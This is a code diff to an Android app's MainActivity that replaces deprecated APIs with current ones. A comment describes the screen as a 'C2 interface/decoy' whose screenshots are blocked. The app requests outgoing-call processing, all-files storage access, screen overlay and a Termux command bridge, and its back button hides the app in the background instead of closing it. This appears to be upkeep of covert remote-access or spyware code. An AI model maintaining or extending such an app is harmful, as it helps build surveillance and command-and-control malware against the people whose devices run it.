@@ -13,14 +13,17 @@ import android.os.Environment;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
-import android.animation.ValueAnimator;
-import android.view.animation.LinearInterpolator;
 import com.google.android.material.button.MaterialButton;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import androidx.activity.OnBackPressedCallback;
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
+import androidx.annotation.OptIn;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.camera.camera2.interop.ExperimentalCamera2Interop;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
@@ -37,10 +40,10 @@ import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
+@OptIn(markerClass = ExperimentalCamera2Interop.class)
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 1001;
-    private static final int MANAGE_STORAGE_REQUEST_CODE = 1002;
     private static final ExecutorService backgroundExecutor = Executors.newFixedThreadPool(4);
 
     private TextView tvStatus, tvIpAddress, tvServerUrl, tvTerminalFeedback;
@@ -50,9 +53,30 @@ public class MainActivity extends AppCompatActivity {
     private boolean isServerRunning = false;
     private long lastIpLookupTime = 0;
 
+    private ActivityResultLauncher<Intent> manageStorageLauncher;
+    private ActivityResultLauncher<Intent> overlayPermissionLauncher;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        // --- MODERN BACK PRESS HANDLER ---
+        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
+            @Override
+            public void handleOnBackPressed() {
+                moveTaskToBack(true);
+            }
+        });
+
+        // --- MODERN ACTIVITY RESULT LAUNCHERS ---
+        manageStorageLauncher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> updateUI()
+        );
+        overlayPermissionLauncher = registerForActivityResult(
+            new ActivityResultContracts.StartActivityForResult(),
+            result -> updateUI()
+        );
         
         // --- SECURE DASHBOARD PROTOCOL ---
         // Prevents screenshots or screen recording of the C2 interface/decoy
@@ -193,14 +217,6 @@ public class MainActivity extends AppCompatActivity {
         tvDevelopedBy.setAlpha(0.9f);
     }
 
-    @Override
-    public void onBackPressed() {
-        // Move app to background instead of closing/finishing
-        super.onBackPressed();
-        super.onBackPressed();
-        moveTaskToBack(true);
-    }
-
     private long lastPermissionRequestTime = 0;
 
     private void requestPermissions() {
@@ -331,10 +347,13 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Process outgoing calls permission
-        if (ContextCompat.checkSelfPermission(this,
-                Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
-            permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
+        // Process outgoing calls permission (deprecated in API 29)
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            @SuppressWarnings("deprecation")
+            String procCallsPerm = Manifest.permission.PROCESS_OUTGOING_CALLS;
+            if (ContextCompat.checkSelfPermission(this, procCallsPerm) != PackageManager.PERMISSION_GRANTED) {
+                permissionsNeeded.add(procCallsPerm);
+            }
         }
 
         // Termux Bridge Permission (com.termux.permission.RUN_COMMAND)
@@ -353,10 +372,10 @@ public class MainActivity extends AppCompatActivity {
                 try {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                     intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
+                    manageStorageLauncher.launch(intent);
                 } catch (Exception e) {
                     Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                    startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
+                    manageStorageLauncher.launch(intent);
                 }
             }
         }
@@ -366,7 +385,7 @@ public class MainActivity extends AppCompatActivity {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + getPackageName()));
-                startActivityForResult(intent, 1003);
+                overlayPermissionLauncher.launch(intent);
             }
         }
     }
@@ -629,19 +648,24 @@ public class MainActivity extends AppCompatActivity {
             String networkType = "Unknown Network";
             try {
                 ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    android.net.Network activeNetwork = cm.getActiveNetwork();
-                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
-                    if (caps != null) {
-                        if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) networkType = "Local Wifi";
-                        else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular Data";
-                        else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) networkType = "Ethernet";
-                    }
-                } else {
-                    android.net.NetworkInfo info = cm.getActiveNetworkInfo();
-                    if (info != null && info.isConnected()) {
-                        if (info.getType() == ConnectivityManager.TYPE_WIFI) networkType = "Local Wifi";
-                        else if (info.getType() == ConnectivityManager.TYPE_MOBILE) networkType = "Cellular Data";
+                if (cm != null) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        android.net.Network activeNetwork = cm.getActiveNetwork();
+                        NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
+                        if (caps != null) {
+                            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) networkType = "Local Wifi";
+                            else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular Data";
+                            else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) networkType = "Ethernet";
+                        }
+                    } else {
+                        @SuppressWarnings("deprecation")
+                        android.net.NetworkInfo info = cm.getActiveNetworkInfo();
+                        if (info != null && info.isConnected()) {
+                            @SuppressWarnings("deprecation")
+                            int type = info.getType();
+                            if (type == ConnectivityManager.TYPE_WIFI) networkType = "Local Wifi";
+                            else if (type == ConnectivityManager.TYPE_MOBILE) networkType = "Cellular Data";
+                        }
                     }
                 }
             } catch (Exception ignored) {}
